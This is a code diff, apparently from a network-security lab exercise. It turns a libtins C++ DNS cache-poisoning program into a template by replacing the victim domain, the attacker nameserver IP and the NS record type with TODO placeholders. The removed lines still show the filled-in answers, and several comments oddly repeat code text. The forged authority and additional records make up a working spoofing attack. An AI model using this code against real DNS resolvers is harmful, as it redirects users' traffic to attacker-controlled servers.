@@ -14,14 +14,14 @@ int main() {
     srand(time(0));    // Seed random number generator for DNS query ID
 
     // Configuration variables
-    string victim_domain = "google.com";    // Domain to poison string victim_domain = "google.com"; - string victim_domain = "TODO";
+    string target_domain = TODO;    // Target domain to spoof
     string request_hostname = "www.google.com";    // Target domain to spoof
     string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
     string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
     string attacker_ip = "10.0.0.10";    // Attacker's IP address
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
     string attacker_ns = "attacker.google.com";    // Attacker's nameserver
-    string attacker_ns_ip = "10.0.0.70";    // Attacker's DNS server IP - string attacker_ns_ip = "TODO";
+    string attacker_ns_ip = TODO;   // Attacker's nameserver IP address
     int recursive_ns_port = 12345;    // Port of recursive DNS server
 
     PacketSender sender;    // Packet sending utility from libtins
@@ -62,16 +62,16 @@ int main() {
         dns.add_query(DNS::Query("_.google.com", DNS::A, DNS::IN));
 
         dns.add_authority(DNS::Resource(
-            victim_domain,    // Domain requested
-            attacker_ns,    // Domain server of the attacker - TODO
-            DNS::NS,    // Type NS - DNS::TODO,
+            target_domain,    // Domain requested
+            TODO,   // domain server of the attacker
+            DNS::TODO,   // Record type
             DNS::IN,    // Internet class (standard)
             6000    // TTL in seconds
         ));
 
         dns.add_additional(DNS::Resource(
             attacker_ns,    // Domain server of the attacker
-            attacker_ns_ip,    // Attacker's DNS server IP - TODO
+            TODO,    // IP address of the nameserver
             DNS::A,    // Type A
             DNS::IN,    // Internet class (standard)
             6000   // TTL in seconds
